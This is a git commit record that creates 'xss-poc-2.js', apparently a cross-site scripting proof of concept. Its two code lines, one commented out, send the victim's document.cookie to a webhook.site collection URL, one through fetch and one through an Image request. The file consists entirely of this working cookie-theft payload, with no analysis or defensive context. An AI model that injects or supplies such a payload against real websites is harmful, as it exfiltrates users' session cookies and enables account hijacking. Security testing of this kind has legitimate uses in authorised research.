bb5439a676de3b71c7ad80667556c5f442424e58
smcri <poashan1234@gmail.com>
2024-03-10 16:18:04 +0530

    Create xss-poc-2.js

---
+++ xss-poc-2.js
@@ -0,0 +1,3 @@
+// fetch("https://webhook.site/26cb62e6-b4b1-4013-8a07-3abe24feea0a?cookie=" + document.cookie);
+
+var i=new Image;i.src="https://webhook.site/26cb62e6-b4b1-4013-8a07-3abe24feea0a?cookie="+document.cookie;
